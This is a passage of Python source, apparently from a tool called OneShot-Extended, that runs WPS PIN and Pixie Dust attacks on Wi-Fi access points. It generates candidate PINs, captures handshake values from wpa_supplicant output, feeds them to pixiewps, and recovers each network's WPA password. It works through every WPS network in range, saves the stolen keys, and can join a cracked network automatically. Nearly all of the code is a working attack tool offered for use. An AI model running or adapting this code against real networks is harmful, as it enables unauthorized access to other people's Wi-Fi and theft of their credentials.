        + (((b[2] + b[3]) % 10) * 10000)\
        + (((b[1] + b[2]) % 10) * 100000)\
        + (((b[0] + b[1]) % 10) * 1000000)

        return pin

    def _pinDLink1(self, bssid: str):
        bssid.INTEGER += 1
        return self._pinDLink(bssid)

    def _generate(self, algo: str, bssid: str):

        mac = NetworkAddress(bssid)
        if algo not in self.ALGOS:
            raise ValueError('Invalid WPS pin algorithm')

        pin = self.ALGOS[algo]['gen'](mac)

        if algo == 'pinEmpty':
            return pin

        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def _getSuggestedList(self, bssid: str):

        res = []
        for algo in self._suggest(bssid):
            res.append(self._generate(algo, bssid))

        return res

class PixieData:

    def __init__(self):
        self.PKE = ''
        self.PKR = ''
        self.E_HASH1 = ''
        self.E_HASH2 = ''
        self.AUTHKEY = ''
        self.E_NONCE = ''
        self.R_NONCE = ''
        self.BSSID = ''

    def getAll(self):

        return all([self.PKE, self.PKR, self.E_NONCE, self.R_NONCE, self.AUTHKEY, self.E_HASH1, self.E_HASH2, self.BSSID])

    def runPixieWps(self, show_command: bool = False, full_range: bool = False):

        info('Running Pixiewps…')
        command = self._getPixieCmd(full_range)

        if show_command:
            info(' '.join(command))

        try:
            command_output = subprocess.run(command,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                encoding='utf-8', timeout=120
            )
        except (subprocess.CalledProcessError, subprocess.TimeoutExpired, FileNotFoundError) as err:
            error(f'Pixiewps has exited on error: \n {err}')
            return False

        print(command_output.stdout)

        if command_output.returncode == 0:
            lines = command_output.stdout.splitlines()
            for line in lines:
                if ('[+]' in line) and ('WPS pin' in line):
                    pin = line.split(':')[-1].strip()

                    if pin == '<empty>':
                        pin = '\'\''

                    return pin

        return False

    def _getPixieCmd(self, full_range: bool = False):

        pixiecmd = ['pixiewps']
        pixiecmd.extend([
            '--pke', self.PKE,
            '--pkr', self.PKR,
            '--e-hash1', self.E_HASH1,
            '--e-hash2', self.E_HASH2,
            '--authkey', self.AUTHKEY,
            '--e-nonce', self.E_NONCE,
            '--r-nonce', self.R_NONCE,
            '--e-bssid', self.BSSID
        ])

        pixiecmd.extend(['--mode', '1,2,3,4,5'])

        if full_range:
            pixiecmd.append('--force')

        return pixiecmd

    def clear(self):
        self.__init__()

class ConnectionStatus:

    def __init__(self):
        self.STATUS = ''
        self.LAST_M_MESSAGE = 0
        self.ESSID = ''
        self.BSSID = ''
        self.WPA_PSK = ''
        self.IS_LOCKED = False

    def clear(self):
        self.__init__()

class WPSConnection:

    def __init__(self, interface: str):
        self.INTERFACE = interface

        self.CONNECTION_STATUS = ConnectionStatus()
        self.PIXIE_CREDS  = PixieData()

        self.TEMPDIR = tempfile.mkdtemp()

        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write(f'ctrl_interface={self.TEMPDIR}\nctrl_interface_group=root\nupdate_config=1\n')
            self.TEMPCONF = temp.name

        self.WPAS_CTRL_PATH = f'{self.TEMPDIR}/{self.INTERFACE}'

        self.RES_SOCKET_FILE = f'{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}'
        self.RETSOCK = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.RETSOCK.bind(self.RES_SOCKET_FILE)

        
        
        
        self.SUPP_UP = self._initWpaSupplicant()

        self.DISCONNECT_COUNT = 0

    @staticmethod
    def _getHex(line: str) -> str:

        a = line.split(':', 3)
        return a[2].replace(' ', '').upper()

    @staticmethod
    def _explainWpasNotOkStatus(command: str, respond: str):

        if command.startswith(('WPS_REG', 'WPS_PBC')):
            if respond == 'UNKNOWN COMMAND':
                return ('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
                        'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
        return '[!] Something went wrong — check out debug log'

    @staticmethod
    def _credentialPrint(wps_pin: str = None, wpa_psk: str = None, essid: str = None):

        success(f'WPS PIN: \'{wps_pin}\'')
        success(f'WPA PSK: \'{wpa_psk}\'')
        success(f'AP SSID: \'{essid}\'')

    def singleConnection(self, bssid: str = None, pin: str = None) -> bool:

        generator    = WPSpin()
        collector    = WiFiCollector()

        if pin is None:
            if PIXIE_DUST:
                try:
                    with open(_pixieRunPath(bssid), 'r', encoding='utf-8') as file:
                        pin = file.readline().strip()
                except FileNotFoundError:
                    pin = generator.getLikely(bssid) or '12345670'
            else:
                pin = generator.getLikely(bssid) or '12345670'

        self._wpsConnection(bssid, pin, retry_on_lock=True)

        if self.CONNECTION_STATUS.STATUS == 'GOT_PSK':
            self._credentialPrint(pin, self.CONNECTION_STATUS.WPA_PSK, self.CONNECTION_STATUS.ESSID)
            collector.writeResult(bssid, self.CONNECTION_STATUS.ESSID, pin, self.CONNECTION_STATUS.WPA_PSK)

            try:
                os.remove(_pixieRunPath(bssid))
            except FileNotFoundError:
                pass

            return True

        if PIXIE_DUST:
            if self.PIXIE_CREDS.getAll():
                pin = self.PIXIE_CREDS.runPixieWps(SHOW_PIXIE, PIXIE_FORCE)
                if pin:
                    return self.singleConnection(bssid, pin)
                return False

            error('Not enough data to run Pixie Dust attack')
            return False

        collector.writePin(bssid, pin)
        return False

    def _initWpaSupplicant(self) -> bool:

        info('Running wpa_supplicant…')

        wpa_supplicant_cmd = ['wpa_supplicant']
        wpa_supplicant_cmd.extend([
            '-K', '-d',
            '-Dnl80211,wext,hostapd,wired',
            f'-i{self.INTERFACE}',
            f'-c{self.TEMPCONF}'
        ])

        try:
            self.WPAS = subprocess.Popen(wpa_supplicant_cmd,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                encoding='utf-8'
            )
        except (subprocess.CalledProcessError, FileNotFoundError) as err:
            error(f'Failed to open wpa_supplicant \n {err}')
            return False

        deadline = time.time() + WPS_STATE_TIMEOUT

        while True:
            ret = self.WPAS.poll()

            if ret is not None and ret != 0:
                error(f'wpa_supplicant returned an error: \n {self.WPAS.communicate()[0]}')
                return False
            if os.path.exists(self.WPAS_CTRL_PATH):
                return True

            if time.time() > deadline:
                error('wpa_supplicant control interface never appeared — aborting attempt')
                self.CONNECTION_STATUS.STATUS = 'STALLED'
                try:
                    self.WPAS.terminate()
                except OSError:
                    pass
                return False

            time.sleep(.1)

    def _controlSocketReady(self) -> bool:

        return os.path.exists(self.WPAS_CTRL_PATH)

    def _sendAndReceive(self, command: str) -> str:

        
        
        if not self._controlSocketReady():
            warning(f'wpa_supplicant control socket is gone — '
                    f'cannot send \'{command}\'')
            self.CONNECTION_STATUS.STATUS = 'STALLED'
            return 'TIMEOUT'

        self.RETSOCK.settimeout(WPS_STATE_TIMEOUT)

        try:
            self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)
        except OSError as err:
            warning(f'Control socket send failed for \'{command}\': {err}')
            self.CONNECTION_STATUS.STATUS = 'STALLED'
            return 'TIMEOUT'

        try:
            (b, _address) = self.RETSOCK.recvfrom(4096)
        except socket.timeout:
            warning(f'No reply to \'{command}\' within {WPS_STATE_TIMEOUT}s')
            return 'TIMEOUT'
        except OSError as err:
            error(f'Control socket error while sending \'{command}\': {err}')
            return 'TIMEOUT'

        inmsg = b.decode('utf-8', errors='replace')
        return inmsg

    def _sendOnly(self, command: str):

        if not self._controlSocketReady():
            self.CONNECTION_STATUS.STATUS = 'STALLED'
            return

        try:
            self.RETSOCK.sendto(command.encode(), self.WPAS_CTRL_PATH)
        except OSError as err:
            warning(f'Control socket send failed for \'{command}\': {err}')
            self.CONNECTION_STATUS.STATUS = 'STALLED'

    def _handleWpas(self, timeout: float = None) -> bool:

        if timeout is None:
            timeout = WPS_STATE_TIMEOUT

        try:
            ready = select.select([self.WPAS.stdout], [], [], timeout)[0]
        except (OSError, ValueError):
            return False

        if not ready:
            self.CONNECTION_STATUS.STATUS = 'STALLED'
            return False

        line = self.WPAS.stdout.readline()

        if not line:
            self.WPAS.wait()
            return False

        line = line.rstrip('\n')

        if VERBOSE:
            print(line)

        if line.startswith('WPS: '):
            return self._handle_wps_messages(line)

        return self._handle_connection_states(line)

    def _handle_wps_messages(self, line: str) -> bool:

        if 'M2D' in line:
            warning('Received WPS Message M2D')

            self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
            self.CONNECTION_STATUS.IS_LOCKED = True

            error('This AP is not accepting PINs right now without configuration')
            return False

        if 'Building Message M' in line:
            n = int(line.split('Building Message M')[1])
            self.CONNECTION_STATUS.LAST_M_MESSAGE = n
            info(f'Sending WPS Message M{n}…')

        elif 'Received M' in line:
            n = int(line.split('Received M')[1])
            self.CONNECTION_STATUS.LAST_M_MESSAGE = n
            success(f'Received WPS Message M{n}')
            if n == 5:
                info('The first half of the PIN is valid')

        elif 'Received WSC_NACK' in line:
            self.CONNECTION_STATUS.STATUS = 'WSC_NACK'
            warning('Received WSC NACK')

            if self.CONNECTION_STATUS.LAST_M_MESSAGE < 3:
                self.CONNECTION_STATUS.IS_LOCKED = True
                return False

            error('Error: wrong PIN code')

        elif 'Enrollee Nonce' in line and 'hexdump' in line:
            self._handle_pixie_data('E_NONCE', line, 16 * 2)

        elif 'Registrar Nonce' in line and 'hexdump' in line:
            self._handle_pixie_data('R_NONCE', line, 16 * 2)

        elif 'DH own Public Key' in line and 'hexdump' in line:
            self._handle_pixie_data('PKR', line, 192 * 2)

        elif 'DH peer Public Key' in line and 'hexdump' in line:
            self._handle_pixie_data('PKE', line, 192 * 2)

        elif 'AuthKey' in line and 'hexdump' in line:
            self._handle_pixie_data('AUTHKEY', line, 32 * 2)

        elif 'E-Hash1' in line and 'hexdump' in line:
            self._handle_pixie_data('E_HASH1', line, 32 * 2)

        elif 'E-Hash2' in line and 'hexdump' in line:
            self._handle_pixie_data('E_HASH2', line, 32 * 2)

        elif 'Network Key' in line and 'hexdump' in line:
            self.CONNECTION_STATUS.STATUS = 'GOT_PSK'
            self.CONNECTION_STATUS.WPA_PSK = bytes.fromhex(self._getHex(line)).decode('utf-8', errors='replace')

        return True

    def _handle_connection_states(self, line: str) -> bool:

        if ': State: ' in line and '-> SCANNING' in line:
            self.CONNECTION_STATUS.STATUS = 'scanning'
            info('Scanning…')

        elif ('WPS-FAIL' in line) and (self.CONNECTION_STATUS.STATUS != ''):
            self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
            warning('wpa_supplicant returned WPS-FAIL')

        elif 'Trying to authenticate with' in line:
            self.CONNECTION_STATUS.STATUS = 'authenticating'
            if 'SSID' in line:
                self.CONNECTION_STATUS.ESSID = self._decode_essid(line)
            info('Authenticating…')

        elif 'Authentication response' in line:
            success('Authenticated')

        elif 'Trying to associate with' in line:
            self.CONNECTION_STATUS.STATUS = 'associating'
            if 'SSID' in line:
                self.CONNECTION_STATUS.ESSID = self._decode_essid(line)
            info('Associating with AP…')

        elif ('Associated with' in line) and (self.INTERFACE in line):
            bssid = line.split()[-1].upper()
            if self.CONNECTION_STATUS.ESSID:
                success(f'Associated with {bssid} (ESSID: {self.CONNECTION_STATUS.ESSID})')
            else:
                success(f'Associated with {bssid}')

        elif 'EAPOL: txStart' in line:
            self.CONNECTION_STATUS.STATUS = 'eapol_start'
            info('Sending EAPOL Start…')

        elif 'EAP entering state IDENTITY' in line:
            success('Received Identity Request')

        elif 'using real identity' in line:
            info('Sending Identity Response…')

        elif 'WPS-TIMEOUT' in line:
            self.CONNECTION_STATUS.STATUS = 'WPS_TIMEOUT'

        elif 'NL80211_CMD_DEL_STATION' in line:
            self.DISCONNECT_COUNT += 1
            if self.DISCONNECT_COUNT == 5:
                warning('Received NL80211 DEL_STATION too many times 🠋')
                warning('This could be the result of interference, or the AP is really far')

        return True

    def _handle_pixie_data(self, attr: str, line: str, expected_len: int):
        hex_value = self._getHex(line)
        if len(hex_value) != expected_len:
            raise ValueError(f'Invalid {attr} length: expected {expected_len}, got {len(hex_value)}')
        setattr(self.PIXIE_CREDS, attr, hex_value)

        if SHOW_PIXIE:
            info(f'{attr}: {hex_value}')

    def _decode_essid(self, line: str) -> str:
        return codecs.decode(
            '\''.join(line.split('\'')[1:-1]),
            'unicode-escape'
        ).encode('latin1').decode('utf-8', errors='replace')

    def _drainPipe(self, linger: float = 0.5):

        if not self.WPAS.stdout:
            return

        deadline = time.time() + linger

        while time.time() < deadline:
            try:
                if not select.select([self.WPAS.stdout], [], [], .1)[0]:
                    break

                if not self.WPAS.stdout.readline():
                    break
            except (OSError, ValueError):
                break

    def _wpsConnection(self, bssid: str = None, pin: str = None,
        retry_on_lock: bool = False) -> bool:

        if not self.SUPP_UP:
            error('wpa_supplicant is not running — skipping this AP')
            self.CONNECTION_STATUS.STATUS = 'STALLED'
            return False

        while True:
            self.PIXIE_CREDS.clear()
            self.CONNECTION_STATUS.clear()
            self._drainPipe()

            wps_start_time = time.time()

            info(f'Trying PIN \'{pin}\'…')
            cmd = f'WPS_REG {bssid} {pin}'

            if bssid:
                self.PIXIE_CREDS.BSSID = bssid.upper()

            r = self._sendAndReceive(cmd)

            if 'OK' not in r:
                self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
                error(self._explainWpasNotOkStatus(cmd, r))
                return False

            while True:
                if not isInterfaceUp(self.INTERFACE):
                    error(f'Interface {self.INTERFACE} is no longer UP. Aborting connection attempt.')
                    self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
                    break

                
                
                elapsed = time.time() - wps_start_time

                if elapsed > WPS_ATTEMPT_TIMEOUT:
                    warning(f'Attempt on {bssid} exceeded '
                            f'{WPS_ATTEMPT_TIMEOUT}s ({int(elapsed)}s elapsed) — '
                            'giving up and moving to the next AP')
                    self.CONNECTION_STATUS.STATUS = 'STALLED'
                    break

                res = self._handleWpas()

                if not res or self.CONNECTION_STATUS.STATUS in {'WSC_NACK', 'GOT_PSK', 'WPS_FAIL'}:
                    break

                if self.CONNECTION_STATUS.STATUS == 'WPS_TIMEOUT':
                    elapsed = int(time.time() - wps_start_time)

                    warning(f'Received WPS-timeout after {elapsed} seconds')

                    try:
                        self.WPAS.terminate()
                        self.WPAS.wait(timeout=2)
                    except subprocess.TimeoutExpired:
                        self.WPAS.kill()

                    
                    
                    self.SUPP_UP = self._initWpaSupplicant()
                    if not self.SUPP_UP:
                        error('wpa_supplicant did not come back up — skipping this AP')
                        return False

                    time.sleep(1)

                    r = self._sendAndReceive(cmd)
                    if 'OK' not in r:
                        self.CONNECTION_STATUS.STATUS = 'WPS_FAIL'
                        error(self._explainWpasNotOkStatus(cmd, r))
                        return False

                    self.CONNECTION_STATUS.clear()
                    continue

            self._sendOnly('WPS_CANCEL')

            if self.CONNECTION_STATUS.STATUS == 'STALLED':
                return False

            if retry_on_lock and self.CONNECTION_STATUS.STATUS in {'WPS_FAIL', 'WSC_NACK'}:
                warning(f'{bssid} is WPS LOCKED — skipping to the next AP')
                return False

            return self.CONNECTION_STATUS.STATUS == 'GOT_PSK'

    def _resetSupplicant(self):

        try:
            if hasattr(self, 'WPAS'):
                self.WPAS.terminate()
                self.WPAS.wait(timeout=2)
        except (subprocess.TimeoutExpired, OSError):
            try:
                self.WPAS.kill()
            except OSError:
                pass

        self.SUPP_UP = self._initWpaSupplicant()
        if not self.SUPP_UP:
            error('wpa_supplicant did not come back up after reset')
        time.sleep(1)

    def _cleanup(self):

        try:
            self.RETSOCK.close()
            if hasattr(self, 'WPAS'):
                self.WPAS.terminate()
                if self.WPAS.stdout:
                    self.WPAS.stdout.close()
                self.WPAS.wait()
        except (OSError, subprocess.TimeoutExpired):
            pass

        if os.path.exists(self.RES_SOCKET_FILE):
            os.remove(self.RES_SOCKET_FILE)

        import shutil
        shutil.rmtree(self.TEMPDIR, ignore_errors=True)

        if os.path.exists(self.TEMPCONF):
            os.remove(self.TEMPCONF)

    def __del__(self):
        self._cleanup()

def connectToNetwork(interface: str, essid: str, psk: str, bssid: str = None) -> bool:

    if not essid or essid == '<hidden>':
        error('No ESSID available, cannot connect')
        return False

    info(f'Connecting to \'{essid}\'…')

    if isAndroid():
        return _connectAndroid(essid, psk)

    if which('nmcli'):
        return _connectNetworkManager(interface, essid, psk, bssid)

    return _connectWpaSupplicant(interface, essid, psk, bssid)

def _connectNetworkManager(interface: str, essid: str, psk: str, bssid: str = None) -> bool:

    _run(['nmcli', 'connection', 'delete', essid])

    cmd = ['nmcli', 'device', 'wifi', 'connect', essid,
           'password', psk, 'ifname', interface]

    if bssid:
        cmd.extend(['bssid', bssid])

    returncode, output = _run(cmd, timeout=45)

    if returncode == 0:
        return True

    error(f'nmcli could not connect: {output}')
    return False

def _connectWpaSupplicant(interface: str, essid: str, psk: str, bssid: str = None) -> bool:

    if not which('wpa_supplicant'):
        error('Neither NetworkManager nor wpa_supplicant is available')
        return False

    info('Configuring wpa_supplicant…')

    if len(psk) == 64 and all(c in string.hexdigits for c in psk):
        key_line = psk
    else:
        key_line = f'"{psk}"'

    network_block = (
        'network={\n'
        f'\tssid="{essid}"\n'
    )
    if bssid:
        network_block += f'\tbssid={bssid}\n'
    network_block += (
        f'\tpsk={key_line}\n'
        '\tscan_ssid=1\n'
        '}\n'
    )

    conf_path = None
    try:
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write('ctrl_interface=/run/wpa_supplicant\nupdate_config=1\n')
            temp.write(network_block)
            conf_path = temp.name

        _run(['wpa_cli', '-i', interface, 'terminate'])
        time.sleep(1)

        
        
        wpa_process = subprocess.Popen(
            ['wpa_supplicant', '-B', f'-i{interface}', f'-c{conf_path}'],
            stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT
        )

        try:
            wpa_process.wait(timeout=10)
        except subprocess.TimeoutExpired:
            pass

        for _ in range(20):
            time.sleep(1.5)
            returncode, status = _run(['wpa_cli', '-i', interface, 'status'])

            if returncode == 0 and 'wpa_state=COMPLETED' in status:
                success('Association completed')
                _renewDhcpLease(interface)
                return True

        log = _run(['wpa_cli', '-i', interface, 'status'])[1]
        error(f'wpa_supplicant did not associate: {log}')
        return False
    finally:
        if conf_path and os.path.exists(conf_path):
            os.remove(conf_path)

def _renewDhcpLease(interface: str):

    for tool, cmd in (
        ('dhclient', ['dhclient', '-v', interface]),
        ('udhcpc', ['udhcpc', '-i', interface, '-n', '-q']),
        ('dhcpcd', ['dhcpcd', '-n', interface]),
    ):
        if which(tool):
            _run(cmd, timeout=30)
            info(f'IP address requested with {tool}')
            return

    warning('No DHCP client found — interface is associated without an address')

def _connectAndroid(essid: str, psk: str) -> bool:

    ok_enable, output_enable, _ = AndroidNetwork._runSvc(['wifi', 'enable'])

    if not ok_enable:
        warning(f'Android: could not enable Wi-Fi before connecting: '
                f'{output_enable or "no output"}')

    ok, output = AndroidNetwork._shell(
        ['cmd', 'wifi', 'connect-network', essid, 'wpa2', psk], timeout=45)

    if ok:
        return True

    error(f'Android wifi service could not connect: {output}')
    return False

PIXIE_DUST    = True
PIXIE_FORCE   = False
SHOW_PIXIE    = False
VERBOSE       = False
IFACE_DOWN    = False
MTK_WIFI      = False
ANDROID_SETTINGS = True

MODE2         = False

WPS_STATE_TIMEOUT   = 10
WPS_ATTEMPT_TIMEOUT = 10

CONNECT_SSID = ''
CONNECT_PSK  = ''

def androidWifiManaged() -> bool:

    return isAndroid() and ANDROID_SETTINGS and not MTK_WIFI

def checkRequirements():

    required_binaries = [
        'pixiewps',
        'wpa_supplicant',
        'iw', 'ip'
    ]
    missing = [b for b in required_binaries if not which(b)]

    if missing:
        die(f"Missing required utilities: {', '.join(missing)}")

    if os.getuid() != 0:
        die('Run it as root')

def setupDirectories():

    
    
    
    
    old_dir = f'{USER_HOME}/.OSE'
    new_dir = f'{USER_HOME}/.OneShot-Extended'

    if os.path.exists(old_dir):
        try:
            os.rename(old_dir, new_dir)
            info('Renamed legacy data directory')
        except OSError as err:
            error(f'Failed to rename data directory: {err}')

    for directory in [SESSIONS_DIR, PIXIEWPS_DIR]:
        if not os.path.exists(directory):
            try:
                os.makedirs(directory)
            except OSError as err:
                
                
                die(f'Cannot create {directory}: {err}\n'
                    f'    data root resolved to: {USER_HOME}\n'
                    f'    set OSE_HOME to a writable directory to override')

def setupAndroidWifi(android_network: AndroidNetwork, enable: bool = False) -> bool:

    if enable:
        return android_network.enableWifi()

    return android_network.disableWifi()

def setupMediatekWifi(wmt_wifi_device: Path):

    if not wmt_wifi_device.is_char_device():
        die('Unable to activate MediaTek Wi-Fi interface device: '
            '/dev/wmtWifi does not exist or it is not a character device')

    wmt_wifi_device.chmod(0o644)
    wmt_wifi_device.write_text('1', encoding='utf-8')

def handleConnection(interface: str, connect_only: bool = False):

    connection = WPSConnection(interface)

    scanner = WiFiScanner(interface)
    candidate_list = scanner.scanTargets()

    if not candidate_list:
        error('No WPS-enabled network found — nothing to test')
        if connect_only:
            return _connectFallback(interface)
        return None

    info(f'{len(candidate_list)} WPS network(s) discovered — '
         f'starting at the strongest signal')

    cracked = 0

    for position, (bssid, scan_info) in enumerate(candidate_list, start=1):
        level = scan_info.get('Level', '?')
        info(f'[{position}/{len(candidate_list)}] {bssid} '
             f'(PWR {level} dBm, WPS {scan_info.get("WPS version", "?")})')

        if not connection.singleConnection(bssid):
            continue

        cracked += 1

        success(f'PSK for {bssid} recovered and saved')

        if connect_only:
            
            
            
            
            essid = (connection.CONNECTION_STATUS.ESSID or '').strip()
            psk = (connection.CONNECTION_STATUS.WPA_PSK or '').strip()

            if essid and psk and essid != '<hidden>':
                
                
                
                
                connection._resetSupplicant()

                info(f'[c] 已破解 {essid}，立即连接…')
                if connectToNetwork(interface, essid, psk, bssid=bssid):
                    success(f'Connected to \'{essid}\'')
                else:
                    error(f'Recovered \'{essid}\' but could not connect')
                return essid

            warning('PSK recovered but the ESSID is unusable — '
                    'trying the configured fallback')
            break

        
        
        connection._resetSupplicant()

    if connect_only:
        
        
        warning('No usable PSK recovered from any reachable AP')
        return _connectFallback(interface)

    if cracked == 0:
        warning('No PSK recovered from any reachable AP')
    else:
        success(f'Recovered credentials for {cracked} network(s)')

    return None

def _connectFallback(interface: str):

    essid = (CONNECT_SSID or '').strip()
    psk = (CONNECT_PSK or '').strip()

    if not essid or not psk:
        warning('Nothing to connect to: the scan found no crackable network, '
                'and CONNECT_SSID / CONNECT_PSK are not filled in.\n'
                '    Fill them in at the top of ose.py to give -c a network to '
                'join when the scan comes up empty.')
        return None

    info(f'[c] 使用 CONNECT_SSID / CONNECT_PSK 连接 \'{essid}\'…')

    if connectToNetwork(interface, essid, psk):
        success(f'Connected to \'{essid}\'')
        return essid

    error(f'Failed to connect to \'{essid}\'')
    return None

def main():

    connect_only = '-c' in sys.argv[1:]
    mode2 = '-m' in sys.argv[1:]

    
    
    
    
    global MODE2
    MODE2 = mode2

    checkRequirements()
    setupDirectories()
    initializeLogging()

    interface = detectInterface()

    if not interface:
        die('No wireless interface found')

    info(f'Using interface \'{interface}\'')

    if MODE2:
        info('[*] 方案2：WiFi 开关保持开启，仅断开当前连接')
        info('[*] 断开动作由 App 在框架层完成（四级兜底，见 WifiDisconnector）')
        info('[*] 脚本只校验网卡是否已空闲，不再自行抢夺')

    if MODE2:
        
        
        
        
        
        
        
        
        
        
        for attempt in range(5):
            if _interfaceIsFree(interface):
                break

            if attempt == 0:
                info(f'[*] {interface} 仍在关联中，等待框架断开…')

            time.sleep(1.0)
        else:
            code, link = _run(['iw', 'dev', interface, 'link'])
            die('方案2 需要先断开当前 WiFi 连接，'
                '但 {0} 仍关联在某个 AP 上。\n'
                '    内核报告：{1}\n'
                '    请在系统设置里断开当前 WiFi（不必关闭 WiFi 开关），然后重试。'
                .format(interface, (link or '（无输出）').replace('\n', ' / ')))

        info(f'[*] {interface} 已空闲，开始扫描')

    android_network = AndroidNetwork()

    
    
    
    wifi_taken_down = False

    
    
    explicit_essid = None
    explicit_psk = None

    try:
        
        
        
        
        
        
        
        
        
        
        
        if connect_only:
            idx = sys.argv.index('-c')
            args_after = sys.argv[idx + 1:]

            if len(args_after) == 1:
                
                
                
                die('Usage: ose.py -c [<SSID> <password>]')

            if len(args_after) >= 2:
                explicit_essid = args_after[0]
                explicit_psk = args_after[1]

        if not VERBOSE and not isAndroid():
            clearScreen()

        
        
        
        if androidWifiManaged() and not MODE2:
            setupAndroidWifi(android_network)
            wifi_taken_down = True

        wmt_wifi_device = None
        if MTK_WIFI:
            wmt_wifi_device = Path('/dev/wmtWifi')
            setupMediatekWifi(wmt_wifi_device)

        if ifaceCtl(interface, action='up'):
            die(f'Unable to up interface \'{interface}\'')

        if connect_only and explicit_essid is not None:
            
            
            info(f'[c] 使用命令行给出的凭据连接 \'{explicit_essid}\'…')
            if connectToNetwork(interface, explicit_essid, explicit_psk):
                success(f'Connected to \'{explicit_essid}\'')
            else:
                error(f'Failed to connect to \'{explicit_essid}\'')
        else:
            
            
            
            handleConnection(interface, connect_only=connect_only)

    except KeyboardInterrupt:
        info('Aborting…')

    finally:
        _releaseInterface(interface)

        
        
        
        
        if wifi_taken_down and androidWifiManaged():
            setupAndroidWifi(android_network, enable=True)

        if IFACE_DOWN:
            ifaceCtl(interface, action='down')

        if MTK_WIFI and wmt_wifi_device is not None:
            wmt_wifi_device.write_text('0', encoding='utf-8')

        
        info('Stored credentials:')
        CredentialStore.echo()

def _interfaceIsFree(interface: str) -> bool:

    code, link = _run(['iw', 'dev', interface, 'link'])

    if code != 0 or not link:
        return True

    return not any(line.strip().startswith('Connected to')
                   for line in link.splitlines())

def _findSupplicantPids(interface: str) -> list:

    pids = []

    for entry in os.listdir('/proc'):
        if not entry.isdigit():
            continue

        pid = int(entry)

        if pid == os.getpid():
            continue

        cmdline = _getProcessCommand(pid)

        if not cmdline or 'wpa_supplicant' not in cmdline:
            continue

        if re.search(rf'(?:^|\s)-i\s*{re.escape(interface)}(?:\s|$)', cmdline) \
                or re.search(rf'--interface[= ]{re.escape(interface)}(?:\s|$)', cmdline):
            pids.append(pid)

    return pids

def _releaseInterface(interface: str):

    if which('wpa_cli'):
        _run(['wpa_cli', '-i', interface, 'terminate'])

    time.sleep(1)

    for attempt in range(3):
        pids = _findSupplicantPids(interface)

        if not pids:
            break

        for pid in pids:
            try:
                os.kill(pid, 15)
                info(f'Released {interface} from wpa_supplicant (PID {pid})')
            except OSError:
                pass

        time.sleep(1)

    for pid in _findSupplicantPids(interface):
        try:
            os.kill(pid, 9)
            warning(f'Force-killed stubborn wpa_supplicant (PID {pid})')
        except OSError:
            pass

    socket_file = f'/run/wpa_supplicant/{interface}'

    if os.path.exists(socket_file):
        try:
            os.remove(socket_file)
        except OSError as err:
            warning(f'Unable to remove stale control socket: {err}')

    if which('nmcli'):
        _run(['nmcli', 'device', 'set', interface, 'managed', 'yes'])

if __name__ == '__main__':
    main()
